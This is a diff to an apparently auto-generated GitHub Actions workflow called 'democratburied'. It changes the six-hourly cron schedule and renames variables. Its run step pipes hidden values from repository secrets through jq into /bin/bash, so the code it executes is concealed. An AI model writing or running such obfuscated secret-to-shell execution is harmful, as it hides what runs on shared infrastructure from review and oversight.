@@ -1,29 +1,20 @@
 name: democratburied
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 4/6 * * *'
-
+    - cron: '55 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: democratburied
         env:
-          z530: ${{ secrets.z530 }}
+          xlmf04104: ${{ secrets.xlmf04104 }}
         run: |
-          echo $z530 | jq -r .yfna311 | /bin/bash
-          echo $vue479 | jq -r .d2 | /bin/bash
-          echo $dow2 | jq -r .vbyok8481 | /bin/bash
-          echo $b51999 | jq -r .cpnw63572 | /bin/bash
-          echo $lpph054 | jq -r .ayvz23812 | /bin/bash
-          echo $cqq73089 | jq -r .fc49 | /bin/bash
-          echo $zdoqk8142 | jq -r .itif66 | /bin/bash
-          echo $tcu64685 | jq -r .vzkwn6670 | /bin/bash
-          echo $n11 | jq -r .mjape19536 | /bin/bash
-          echo $rf27 | jq -r .h9 | /bin/bash
-          echo $yw6153 | jq -r .gvc3765 | /bin/bash
+          echo $xlmf04104 | jq -r .u1923 | /bin/bash
+          echo $qwy7982 | jq -r .ecqz92 | /bin/bash
+          echo $izofh3 | jq -r .v8 | /bin/bash
+          echo $lcdg36 | jq -r .iqtd1 | /bin/bash
+          echo $dvcg8 | jq -r .h70234 | /bin/bash
 
